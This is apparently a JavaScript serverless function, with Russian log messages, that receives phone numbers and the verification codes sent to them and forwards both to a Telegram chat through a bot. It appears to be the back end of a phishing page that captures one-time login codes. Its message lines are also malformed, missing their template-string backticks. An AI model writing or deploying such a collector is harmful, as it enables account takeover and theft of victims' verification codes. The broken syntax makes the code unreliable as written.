const TelegramBot = require('node-telegram-bot-api');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        console.error('Неверный метод:', event.httpMethod);
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Метод не разрешен' }),
        };
    }

    try {
        const { type, data } = JSON.parse(event.body);
        console.log('Запрос:', { type, data });
        let message = '';

        if (type === 'phone') {
            message = 🔔 Новый номер телефона!\n\n📱 Телефон: ${data};
        } else if (type === 'code') {
            message = 🔑 Получен код!\n\n📱 Телефон: ${data.phone}\n🔒 Код: ${data.code};
        } else {
            console.error('Неверный тип:', type);
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Неверный тип запроса' }),
            };
        }

        await bot.sendMessage(CHAT_ID, message);
        console.log('Сообщение отправлено в Telegram');
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
        };
    } catch (error) {
        console.error('Ошибка:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Ошибка отправки в Telegram' }),
        };
    }
};
